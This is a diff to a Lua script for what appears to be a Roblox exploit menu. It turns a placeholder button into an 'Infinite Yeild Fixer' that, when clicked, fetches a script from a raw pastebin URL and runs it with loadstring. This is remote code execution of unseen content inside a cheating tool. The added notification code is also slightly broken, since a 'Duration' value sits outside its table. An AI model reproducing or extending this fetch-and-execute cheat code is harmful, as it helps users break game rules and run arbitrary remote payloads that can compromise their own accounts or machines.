@@ -124,12 +124,18 @@ EXPLOIT1.BackgroundColor3 = Color3.fromRGB(68, 68, 68)
 EXPLOIT1.Position = UDim2.new(0.0323740989, 0, 0.0526315793, 0)
 EXPLOIT1.Size = UDim2.new(0, 70, 0, 32)
 EXPLOIT1.Font = Enum.Font.Gotham
-EXPLOIT1.Text = "Soon"
+EXPLOIT1.Text = "Infinite Yeild Fixer"
 EXPLOIT1.TextColor3 = Color3.fromRGB(255, 255, 255)
 EXPLOIT1.TextScaled = true
 EXPLOIT1.TextSize = 14.000
 EXPLOIT1.TextWrapped = true
 EXPLOIT1.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/c1RQB5R0",true))()
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+	Title = "Script:";
+	Text = "Successfully Executed  Infinite Yeild Fixer!";
+	Icon = "rbxthumb://type=Asset&id=8036184560&w=150&h=150"})
+Duration = 16;
 end)
 
 UICorner_11.Parent = EXPLOIT1
